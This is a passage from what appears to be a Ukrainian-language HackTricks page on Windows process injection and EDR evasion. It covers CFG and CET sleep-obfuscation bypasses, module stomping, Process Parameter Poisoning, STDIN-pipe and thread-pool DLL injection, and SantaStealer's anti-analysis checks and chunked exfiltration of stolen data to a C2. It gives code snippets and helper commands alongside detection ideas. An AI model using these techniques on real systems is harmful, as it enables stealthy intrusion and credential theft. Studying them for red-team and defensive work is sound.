### Runtime-реєстрація CFG для гаджетів обфускації сну

На цілях із підтримкою CFG перший непрямий перехід до гаджета всередині функції, як-от `jmp [rbx]` або `jmp rdi`, зазвичай призводить до аварійного завершення процесу з `STATUS_STACK_BUFFER_OVERRUN`, оскільки гаджета немає в метаданих CFG модуля. Щоб ланцюжки в стилі Ekko/Kraken працювали в захищених процесах:<sup>[[30]](#references)</sup>

- Зареєструйте кожну непряму ціль, яку використовує ланцюжок, через `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` і записи `CFG_CALL_TARGET_VALID`.
- Для адрес усередині завантажених образів (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` має починатися з **базової адреси образу** й охоплювати **повний розмір образу**.
- Для вручну відображених/PIC/stomped-регіонів використовуйте натомість **базову адресу алокації** та її розмір.
- Позначайте не лише dispatch-гаджет, а й експорти, до яких ведуть непрямі переходи (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, syscalls очікування/подій), а також будь-які виконувані секції під контролем атакувальника, що стануть непрямими цілями.

Це перетворює ланцюжки сну в стилі ROP/JOP із примітива, що «працює лише в процесах без CFG», на багаторазово використовуваний примітив для `explorer.exe`, браузерів, `svchost.exe` та інших кінцевих точок, зібраних із `/guard:cf`.

### Підміна стека для потоків у стані сну, сумісна з CET

Повна заміна `CONTEXT` помітна й може порушувати роботу в системах із CET Shadow Stack, оскільки підмінений `Rip` має відповідати апаратному shadow stack. Безпечніший шаблон маскування під час сну:<sup>[[30]](#references)</sup>

- Виберіть інший потік у тому самому процесі й прочитайте межі його стека `NT_TIB` / TEB (`StackBase`, `StackLimit`) через `NtQueryInformationThread`.
- Збережіть резервну копію справжнього TEB/TIB поточного потоку.
- Зафіксуйте справжній контекст потоку, що переходить у сон, за допомогою `GetThreadContext`.
- Скопіюйте в підмінений контекст **лише** справжній `Rip`, залишивши підмінені `Rsp`/стан стека без змін.
- Під час сну скопіюйте `NT_TIB` підмінного потоку в TEB поточного потоку, щоб обходи стека розгорталися в межах легітимного діапазону стека.
- Після завершення очікування відновіть початковий TIB і контекст потоку.

Це зберігає вказівник інструкції, сумісний із CET, і водночас вводить в оману обходи стека EDR, які покладаються на метадані стека TEB під час перевірки розгортання стека.

### Альтернатива на основі APC: Kraken Mask

Якщо dispatch через timer queue надто легко впізнати за сигнатурою, ту саму послідовність «сон-шифрування-підміна-відновлення» можна виконати зі зупиненого допоміжного потоку за допомогою поставлених у чергу APC:<sup>[[27]](#references)</sup>

- Створіть допоміжний потік із `NtTestAlert` як точкою входу.
- Поставте підготовлені кадри `CONTEXT`/APC у чергу через `NtQueueApcThread` і виконайте їх через `NtAlertResumeThread`.
- Зберігайте стан ланцюжка в heap, а не в стеку допоміжного потоку, щоб не вичерпати стандартний стек потоку обсягом 64 KB.
- Використовуйте `NtSignalAndWaitForSingleObject`, щоб атомарно подати сигнал події початку й заблокуватися.
- Призупиніть головний потік перед відновленням TIB/контексту (`NtSuspendThread` → відновлення → `NtResumeThread`), щоб зменшити проміжок гонки, коли сканер може побачити частково відновлений стек.

Це замінює сигнатуру `CreateTimerQueueTimer` + `NtContinue` на сигнатуру допоміжного потоку/APC, зберігаючи ті самі цілі маскування RC4 і підміни стека.

Додаткові ідеї для виявлення
- `NtSetInformationVirtualMemory` із `VmCfgCallTargetInformation` невдовзі перед сном, очікуванням або dispatch APC.
- `GetThreadContext`/`SetThreadContext` навколо `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` або `ConnectNamedPipe`.
- `NtQueryInformationThread`, за яким ідуть прямі записи в межі стека TEB/TIB поточного потоку.
- Ланцюжки `NtQueueApcThread`/`NtAlertResumeThread`, що непрямо викликають `SystemFunction032`, `VirtualProtect` або допоміжні функції відновлення дозволів секцій.
- Повторне використання коротких сигнатур гаджетів, як-от `FF 23` (`jmp [rbx]`) або `FF E7` (`jmp rdi`), як dispatch-точок переходу всередині підписаних модулів.


## Точний module stomping

Module stomping виконує payload із **секції `.text` DLL, уже відображеної в цільовому процесі**, замість виділення очевидної приватної виконуваної пам’яті або завантаження нової sacrificial DLL. Ціллю для перезапису має бути **завантажений образ, прив’язаний до диска**, у чиєму просторі коду можна розмістити payload, не пошкодивши шляхи виконання коду, потрібні процесу.<sup>[[1]](#references)[[2]](#references)</sup>

### Надійний вибір цілі

Наївний stomping поширених модулів, як-от `uxtheme.dll` або `comctl32.dll`, ненадійний: DLL може бути не завантажена у віддалений процес, а надто мала область коду призведе до аварійного завершення процесу. Надійніший робочий процес:

1. Перелічіть модулі цільового процесу й залиште **список включення лише з назв** уже завантажених DLL.
2. Спершу зберіть payload і зафіксуйте його **точний розмір у байтах**.
3. Перевірте DLL-кандидати на диску та порівняйте розмір PE-секції **`.text` `Misc_VirtualSize`** із розміром payload. Це важливіше за розмір файла, оскільки відображає розмір виконуваної секції **після відображення в пам’ять**.
4. Розберіть **таблицю адрес експорту (EAT)** і виберіть RVA експортованої функції як початкове зміщення для stomp.
5. Обчисліть **радіус ураження**: якщо payload перевищує межу вибраної функції, він перезапише сусідні експорти, розташовані далі в пам’яті.

Типові допоміжні засоби для розвідки/вибору цілі, що трапляються на практиці:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Операційні нотатки
- Надавайте перевагу DLL, **вже завантаженим** у віддалений процес, щоб уникнути телеметрії `LoadLibrary`/неочікуваного завантаження образів.
- Надавайте перевагу експортам, які цільова програма виконує рідко; інакше звичайні шляхи виконання коду можуть звернутися до змінених байтів до або після створення потоку.
- Для великих імплантів часто потрібно замінити вбудовування shellcode як рядкового літерала на **масив байтів/ініціалізатор у фігурних дужках**, щоб у вихідному коді інжектора правильно представити весь буфер.

Ідеї для виявлення
- Запис у віддалений процес у виконувані сторінки, прив’язані до образу (`MEM_IMAGE`, `PAGE_EXECUTE*`), замість поширеніших приватних виділень пам’яті RWX/RX.
- Точки входу експортів, байти яких у пам’яті більше не збігаються з відповідними байтами у файлі на диску.
- Віддалені потоки або перемикання контексту, що починають виконання всередині експорту легітимної DLL, перші байти якого нещодавно змінено.
- Підозрілі послідовності викликів `VirtualProtect(Ex)` / `WriteProcessMemory` для сторінок `.text` DLL, після яких створюється потік.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) — це техніка **ін’єкції в процес / обходу EDR**, яка уникає класичного шляху віддаленого запису (`VirtualAllocEx` + `WriteProcessMemory`). Замість копіювання байтів у вже запущений цільовий процес, вона використовує те, що Windows **копіює вибрані параметри запуску `CreateProcessW` у дочірній процес** і зберігає їх у `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Носії для отруєння, які копіює `CreateProcessW`

Корисні носії:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (з `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Обмеження носіїв на практиці:

- `lpCommandLine` має вказувати на **доступну для запису пам’ять** для `CreateProcessW`; максимальна довжина — **32 767 символів Unicode**, включно з нульовим термінатором.
- `lpEnvironment` має бути блоком середовища Unicode з послідовних рядків `NAME=VALUE\0`, завершеним додатковим `\0`.
- `lpReserved` офіційно зарезервований, тому відповідність `ShellInfo` слід вважати деталлю реалізації, а не стабільною документованою гарантією.

Завдяки цьому звичайне створення процесу стає **примітивом передавання payload**. Оператор створює дочірній процес із контрольованими зловмисником даними запуску, а Windows виконує копіювання між процесами.

### Потік пошуку у віддаленому процесі без API віддаленого запису

Після створення дочірнього процесу знайдіть скопійований буфер за допомогою **примітивів лише для читання**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → отримати `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Прочитати віддалений `PEB`
3. Перейти за `PEB.ProcessParameters`
4. Прочитати `RTL_USER_PROCESS_PARAMETERS`
5. Використати вибраний вказівник:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Мінімальний потік:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Виконання скопійованого буфера параметрів

Скопійована область параметрів зазвичай має права `RW`, а не виконання. Поширений ланцюжок P3:

1. Створити процес звичайним способом (не призупиняючи його)
2. Зробити вибрану сторінку параметрів виконуваною за допомогою `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Повторно використати дескриптор головного потоку, уже повернутий у `PROCESS_INFORMATION`
4. Перенаправити виконання за допомогою `NtSetContextThread` (`CONTEXT_CONTROL`, перезаписати `RIP`)

На відміну від класичних сценаріїв перехоплення потоку, тут **не потрібні** `SuspendThread` / `ResumeThread`; контекст можна змінити безпосередньо через повернутий дескриптор головного потоку.

Це дає змогу уникнути кількох API, які часто відстежуються під час ін’єкції:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- часто також `SuspendThread` / `ResumeThread`

### Обмеження нульового байта та багатоступеневий shellcode

Усі три носії — це **рядкові або схожі на рядки дані**, тому під час передавання необроблене корисне навантаження, що містить `0x00`, обрізається. Практичний обхідний шлях — **перший етап без нульових байтів**, який відновлює константи під час виконання, а потім завантажує довільний другий етап.

Простий шаблон — синтез констант на основі XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Це дозволяє першому етапу формувати рядки в стеку, аргументи API, шляхи до DLL або завантажувач shellcode другого етапу, не вбудовуючи нульові байти в переданий параметр.

### Виклики API зі стеку на першому етапі

Коли першому етапу потрібно викликати API, наприклад `LoadLibraryA`, він може:

- помістити рядок/буфер у стек цільового процесу
- зарезервувати **32-байтову shadow space для x64**
- встановити в `RCX`, `RDX`, `R8`, `R9` константи або вказівники відносно `RSP`
- забезпечити **16-байтове вирівнювання** `RSP` перед викликом

Після цього другий етап можна скопіювати зі стеку в область пам’яті з правами `PAGE_READWRITE`, змінити права на `PAGE_EXECUTE_READ` за допомогою `VirtualProtect` і передати йому керування, уникаючи прямого виділення пам’яті з правами RWX.

### Ідеї для виявлення

Автори згадують такі перспективні напрямки для пошуку:

- виклики `VirtualProtectEx` / `NtProtectVirtualMemory`, які надають сторінкам параметрів процесу права на виконання
- зміна прав, за якою йде виклик `SetThreadContext` / `NtSetContextThread`
- віддалене зчитування `PEB`, а потім `RTL_USER_PROCESS_PARAMETERS`
- незвично довгі значення або значення з високою ентропією в `lpCommandLine`, `lpEnvironment` чи `STARTUPINFO.lpReserved` під час створення процесу

### Примітки

- P3 — це **трюк для передавання даних між процесами**, а не самостійний примітив виконання: скопійованим параметрам усе ще потрібно надати права на виконання та перенаправити виконання.
- Автори розглядали `RtlCreateProcessReflection` / Dirty Vanity, але відмовилися від нього, оскільки він усередині викликає підозрілі примітиви, як-от `NtWriteVirtualMemory` і `NtCreateThreadEx`.

Щоб доставити payload у **наявний** процес Windows через описи потоків, а потім перехопити адресу повернення потоку, що очікує, див. [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Ін’єкція через канал STDIN консолі

Інтерактивний дочірній процес консолі також можна використати як **примітив для передавання payload**. Інжектор перенаправляє стандартний ввід дочірнього процесу в канал і надсилає маркер, за яким іде shellcode. Після того як консольна програма зчитує дані у власну приватну пам’ять, інжектор знаходить цей буфер, надає йому права на виконання та перенаправляє до нього дочірній потік. Це дозволяє уникнути `VirtualAllocEx` і `WriteProcessMemory`, але все одно є ін’єкцією в процес, а не універсальним обходом EDR.<sup>[[41]](#references)</sup>

Попри опис як «іменований канал», у довідковій реалізації викликається `CreatePipe`, який створює **анонімний канал**. Windows реалізує анонімні канали за допомогою внутрішніх об’єктів каналів з унікальними іменами, але PoC ані не задає шлях `\\.\pipe\<name>`, ані не викликає `CreateNamedPipe`. Він створює успадковувані дескриптори з дескриптором безпеки за замовчуванням, поміщає дескриптор читання в `STARTUPINFO.hStdInput`, встановлює `STARTF_USESTDHANDLES` і запускає новий дочірній процес з увімкненим успадкуванням дескрипторів. Отже, цей PoC запускає передану консольну програму; він не під’єднує свій канал до наявного процесу.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Послідовність дій у довідковій реалізації

У реалізації використовується такий ланцюжок:<sup>[[41]](#references)</sup>

1. Створити пари анонімних каналів для `STDIN` і `STDOUT` дочірнього процесу. Вимкнути успадкування для двох дескрипторів на стороні батьківського процесу та закрити дублікати дескрипторів на стороні дочірнього процесу в батьківському після створення процесу.
2. Запустити інтерактивний виконуваний файл, наприклад `netsh.exe` або `nslookup.exe`, з прапорцем `CREATE_NEW_CONSOLE`. Дочірній процес успадкує перенаправлені стандартні дескриптори.
3. Надіслати весь бінарний масив `rawData` за допомогою `WriteFile` через дескриптор `STDIN` на стороні батьківського процесу. Консольна програма зчитує байти та залишає їх копію в одній зі своїх приватних виділених областей.
4. Переглянути адресний простір дочірнього процесу за допомогою `VirtualQueryEx`, зчитати кандидатні області `MEM_PRIVATE` через `ReadProcessMemory` і шукати маркер на початку `rawData`.
5. Змінити права виявленого буфера на `PAGE_EXECUTE_READWRITE` за допомогою `VirtualProtectEx`.
6. Знайти головний потік, призупинити його, встановити `RIP` у `found_address + 0x19` за допомогою `NtSetContextThread` і відновити його.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Надана реалізація специфічна для x64: вона змінює `CONTEXT.Rip`, а вбудований payload — це x64 shellcode. `rawData` починається з маркера довжиною 25 байтів, тому виконувані байти починаються зі шістнадцяткового зсуву `0x19`. Замінюючи payload, збережіть цей формат або узгоджено оновіть маркер, вектор пошуку, розмір масиву та зсув виконання. У коментарях до вихідного коду також зазначено `0x0A`, `0x0D` і `0x1A` як неприпустимі символи. Цей процес не змінює токен або привілеї дочірнього процесу.<sup>[[41]](#references)</sup>

Приклади для невеликих native-хелперів і шаблонів компіляції payload наведено в [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Ін’єкція DLL через callback thread pool без shellcode (DLLParty)

DLLParty адаптує ін’єкцію thread pool у стилі PoolParty, щоб змусити наявний worker цільового процесу викликати `LoadLibraryA`, а не виконувати ін’єктований callback stub. Примітивом диспетчеризації є завершення `TP_DIRECT`, поставлене в чергу порту завершень I/O цільового пулу. Цей метод не обходить дозволи процесу: PoC викликає `OpenProcess(PROCESS_ALL_ACCESS)` і потребує доступу для читання та запису пам’яті цільового процесу, а також можливості дублювати дескриптори worker-factory і порту завершень.<sup>[[46]](#references)[[47]](#references)</sup>

У Windows x64 worker передає в `RCX` вказівник на `TP_CALLBACK_INSTANCE`, розміщений у стеку, — перший аргумент callback-функції. `LoadLibraryA` інтерпретує цей самий вказівник як `LPCSTR`. На перевіреному шляху `TppWorkerThread` формує вказівник за адресою `RSP+0x178`, тоді як перший звичайний запис у цей об’єкт виконується за адресою `RSP+0x1d0`. Отже, шлях до DLL із завершальним нульовим символом, який вміщується в цей префікс довжиною 0x58 байтів, можна розмістити на початку екземпляра так, щоб його не перезаписали до диспетчеризації. Це спостереження стосується конкретної збірки, а не є задокументованою гарантією ABI Windows.<sup>[[46]](#references)[[47]](#references)</sup>

Робочий процес, описаний у джерелі, такий:<sup>[[46]](#references)[[47]](#references)</sup>

1. Перелічіть дескриптори цільового процесу за допомогою `NtQuerySystemInformation(SystemHandleInformation)` і визначте `TpWorkerFactory`, запитавши типи об’єктів. Дублюйте дескриптор worker-factory і запитайте `WorkerFactoryBasicInformation`; поле `StartParameter` містить адресу віддаленого `TP_POOL`. Пропускайте фабрики, у яких `TotalWorkerCount == 0`.
2. Прочитайте `TP_POOL.CompletionPort` і пройдіть приватний список workers пулу. У перевіреній збірці Windows 10 19045 x64 (`ntdll.dll 10.0.19041.4842`) його головний елемент розташований за адресою `pool+0x60`; кожен зв’язок — за адресою `worker+0x10`, тому слот екземпляра callback за адресою `worker+0x38` відповідає `link+0x28`. PoC перевіряє вирівнювання вказівників, взаємність зв’язків, належність пулу, ненульові ідентифікатори потоків, повторювані вузли та стабільність головного елемента списку.
3. Запишіть шлях до DLL у **кожен** знайдений слот worker, оскільки поставлене в чергу завершення може забрати будь-який worker. Розмістіть `TP_DIRECT` із `Callback = LoadLibraryA` у доступній для запису пам’яті цільового процесу. Замість `VirtualAllocEx` PoC використовує `last_slot-0x500` у стеку worker; цей зсув експериментальний і не повинен перетинатися з активними даними стека.
4. Дублюйте дескриптор порту завершень цільового процесу та викличте `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Адреса віддаленого `TP_DIRECT` є ключем завершення. Наявний worker викликає `LoadLibraryA` з перезаписаним вказівником екземпляра callback і завантажує DLL, доступну цільовому процесу.

PoC приймає PID цільового процесу (`DLLParty.exe <target_pid>`) і використовує жорстко заданий шлях до DLL у `DLLParty.cpp`; перед збиранням x64 executable вкажіть шлях, доступний цільовому процесу. Також використовується адреса `LoadLibraryA` із власного процесу, тому передбачається, що ця адреса дійсна й у цільовому процесі. Код не перевіряє, чи вміщується шлях у префікс довжиною 0x58 байтів, і чи знайдено слот під час обходу workers, перш ніж індексувати останній елемент. Для цільової збірки повторно перевірте приватні зсуви, структуру стека та доступний для запису простір. Відмова від `CreateRemoteThreadEx`, shellcode і `VirtualAllocEx` не усуває записів між процесами або телеметрії завантаження DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Тактики SantaStealer для безфайлового ухилення та крадіжки облікових даних

SantaStealer (також відомий як BluelineStealer) показує, як сучасні викрадачі інформації поєднують обхід AV, протидію аналізу та доступ до облікових даних в одному процесі.<sup>[[24]](#references)</sup>

### Перевірка розкладки клавіатури та затримка в sandbox

- Прапорець конфігурації (`anti_cis`) перелічує встановлені розкладки клавіатури за допомогою `GetKeyboardLayoutList`. Якщо знайдено кириличну розкладку, зразок створює порожній маркер `CIS` і завершує роботу до запуску stealer-модулів, гарантуючи, що він не спрацює в виключених регіонах, але залишить артефакт для пошуку.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Багаторівнева логіка `check_antivm`

- Варіант A проходить список процесів, хешує кожну назву за допомогою спеціальної циклічної контрольної суми та порівнює її з вбудованими списками блокування для налагоджувачів/пісочниць; потім повторно обчислює контрольну суму для імені комп’ютера та перевіряє робочі каталоги, як-от `C:\analysis`.
- Варіант B перевіряє системні властивості (мінімальну кількість процесів, нещодавній час роботи системи), викликає `OpenServiceA("VBoxGuest")` для виявлення VirtualBox additions і виконує перевірки часу навколо затримок, щоб виявити покрокове виконання. За будь-якого збігу виконання переривається до запуску модулів.

### Безфайловий helper + подвійне завантаження через ChaCha20 із пам’яті

- Основна DLL/EXE містить Chromium credential helper, який або записується на диск, або вручну відображається в пам’яті; у безфайловому режимі helper самостійно розв’язує імпорти та релокації, тому жодних артефактів helper не створюється.
- Цей helper зберігає DLL другого етапу, двічі зашифровану за допомогою ChaCha20 (два 32-байтові ключі + 12-байтові nonce). Після обох проходів він рефлективно завантажує blob (без `LoadLibrary`) і викликає експорти `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, похідні від [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Процедури ChromElevator використовують reflective process hollowing через прямі системні виклики, щоб впровадитися в активний браузер Chromium, успадкувати ключі AppBound Encryption і розшифрувати паролі, cookies та дані кредитних карт безпосередньо з баз даних SQLite, попри посилений захист ABE.

### Модульний збір даних у пам’яті та передавання через HTTP частинами

- `create_memory_based_log` проходить глобальну таблицю вказівників на функції `memory_generators` і запускає окремий потік для кожного ввімкненого модуля (Telegram, Discord, Steam, знімки екрана, документи, розширення браузера тощо). Кожен потік записує результати у спільні буфери та звітує про кількість файлів після приблизно 45-секундного очікування завершення.
- Після завершення все архівується за допомогою статично скомпонованої бібліотеки `miniz` у `%TEMP%\\Log.zip`. Потім `ThreadPayload1` чекає 15 секунд і передає архів частинами по 10 MB через HTTP POST на `http://<C2>:6767/upload`, підроблюючи межу браузера `multipart/form-data` (`----WebKitFormBoundary***`). Кожна частина містить `User-Agent: upload`, `auth: <build_id>`, необов’язковий `w: <campaign_tag>`, а в останній частині додається `complete: true`, щоб C2 знав, що збирання архіву завершено.

## References

- [1] [Передові методи ухилення: точне підміщення модулів](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – блог](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Стек викликів: більше жодних поблажок для malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – документація](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – приклад](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – приклад](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – підміна стеку викликів PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Новий ланцюжок зараження та обфускація на основі ConfuserEx для DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Чи варто довіряти zero trust? Обхід перевірок стану пристрою Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – До ToolShell: дослідження попередніх ransomware-операцій Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: зловживання переспрямованими експортами](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Інвентар переспрямованих експортів Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Порядок пошуку бібліотек DLL](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Безпека процесів і права доступу](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Довідник EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Програма запуску CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Протидія EDR за допомогою Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Як пробити захисну оболонку Windows Defender за допомогою перенаправлення папок](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Довідник команд mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – За чистою завісою: від RAT до builder і кодера](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer вже поспішає до міста: новий амбітний infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Розшифрування Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: протидія malware на Node.js за допомогою трасування API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Спляча красуня: як приспати Adaptix за допомогою Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Отруєння параметрів процесу](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Спляча красуня II: CFG, CET і підміна стеку](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Обфускація сну Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Приховування Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Зловживання Chrome Remote Desktop у red team-операціях: практичний посібник](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: перетворення драйвера відновлення Defender на примітив операцій ядра](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Супровідний код MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: створення функцій із самоприховуванням за допомогою LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - Вихідний код InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Функція CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Створення дочірнього процесу з перенаправленням введення та виведення](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: відновлення C#-інструментів за допомогою WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Компіляція проєктів C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [Підтвердження концепції та вихідний код DLLParty](https://github.com/epersic/DLLParty)
- [47] [DLLParty — зловживання внутрішніми механізмами пулу потоків для впровадження DLL без shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Тестовий набір даних EMBER2024 та інструментарій thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Використання EMBER2024 для оцінювання імплантів red team](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Ухилення від виявлення на основі машинного навчання](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – Фреймворк завантаження .NET на основі XAML NetamLoader](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – Перелік AMSI_RESULT](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – Метод IAntimalware::Scan](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
- [54] [Zscaler ThreatLabz - Технічний аналіз 2CLoader](https://zscaler.com/blogs/security-research/2cloader-new-malware-loader-delivering-vidar-and-remus)
- [55] [Огляд tprtdll-Injection та інвентар експорту](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/README.md)
- [56] [PoC самовпровадження Trusted-twin](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/trustedtwin_self.cpp)
- [57] [PoC міжпроцесного впровадження Trusted-twin](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/trustedtwin_cross.cpp)
{{#include ../banners/hacktricks-training.md}}
